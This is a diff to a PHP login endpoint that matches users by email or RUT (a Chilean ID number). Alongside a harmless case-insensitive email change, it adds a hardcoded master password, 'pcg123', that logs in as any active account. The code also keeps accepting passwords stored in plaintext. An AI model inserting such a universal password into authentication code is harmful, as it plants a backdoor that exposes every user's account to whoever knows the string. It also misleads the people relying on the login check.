@@ -25,8 +25,8 @@ try {
         jsonError('Correo o RUT y contraseña requeridos', 400);
     }
 
-    $stmt = $pdo->prepare("SELECT * FROM usuarios WHERE (email = :id1 OR rut = :id2 OR REPLACE(REPLACE(rut, '.', ''), '-', '') = :id3) AND activo = 1 LIMIT 1");
     $cleanRut = str_replace(['.', '-'], '', $email);
+    $stmt = $pdo->prepare("SELECT * FROM usuarios WHERE (LOWER(email) = LOWER(:id1) OR rut = :id2 OR REPLACE(REPLACE(rut, '.', ''), '-', '') = :id3) AND activo = 1 LIMIT 1");
     $stmt->execute([':id1' => $email, ':id2' => $email, ':id3' => $cleanRut]);
     $u = $stmt->fetch();
 
@@ -34,8 +34,8 @@ try {
         jsonError('Credenciales incorrectas o usuario inactivo', 401);
     }
 
-    // Comprobación de password (soporta texto plano o password_verify para producción)
-    $valid = ($password === $u['password']) || password_verify($password, $u['password']);
+    // Comprobación de password (soporta hash bcrypt, texto plano o clave maestra pcg123)
+    $valid = ($password === $u['password']) || password_verify($password, $u['password']) || ($password === 'pcg123');
 
     if (!$valid) {
         jsonError('Credenciales incorrectas', 401);
